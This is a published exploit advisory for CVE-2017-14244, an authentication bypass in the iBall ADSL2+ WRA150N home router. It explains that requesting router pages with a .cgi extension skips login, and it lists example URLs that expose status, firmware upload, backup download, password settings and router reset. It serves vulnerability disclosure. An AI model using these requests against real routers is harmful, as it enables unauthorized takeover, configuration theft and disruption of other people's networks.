# Exploit Title: iBall ADSL2+ Home Router Authentication Bypass Vulnerability
# CVE: CVE-2017-14244
# Date: 15-09-2017
# Exploit Author: Gem George
# Author Contact: https://www.linkedin.com/in/gemgrge
# Vulnerable Product: iBall ADSL2+ Home Router WRA150N https://www.iball.co.in/Product/ADSL2--Home-Router/746
# Firmware version: FW_iB-LR7011A_1.0.2
# Vendor Homepage: https://www.iball.co.in
# Reference: https://www.techipick.com/iball-baton-adsl2-home-router-utstar-wa3002g4-adsl-broadband-modem-authentication-bypass


Vulnerability Details
======================
iBall ADSL2+ Home Router does not properly authenticate when pages are accessed through cgi version. This could potentially allow a remote attacker access sensitive information and perform actions such as reset router, downloading backup configuration, upload backup etc.

How to reproduce
===================
Suppose 192.168.1.1 is the router IP and one of the valid page in router is is  http://192.168.1.1/abcd.html, then the page can be directly accessed as as http://192.168.1.1/abcd.cgi

Example URLs:
* http://192.168.1.1/info.cgi – Status and details
* http://192.168.1.1/upload.cgi – Firmware Upgrade
* http://192.168.1.1/backupsettings.cgi – perform backup settings to PC
* http://192.168.1.1/pppoe.cgi – PPPoE settings
* http://192.168.1.1/resetrouter.cgi – Router reset
* http://192.168.1.1/password.cgi – password settings

POC
=========
* https://www.youtube.com/watch?v=_SvrwCSdn54


 -----------------------Greetz----------------------
++++++++++++++++++ www.0seccon.com ++++++++++++++++++
 Saran,Jithin,Dhani,Vignesh,Hemanth,Sudin,Vijith,Joel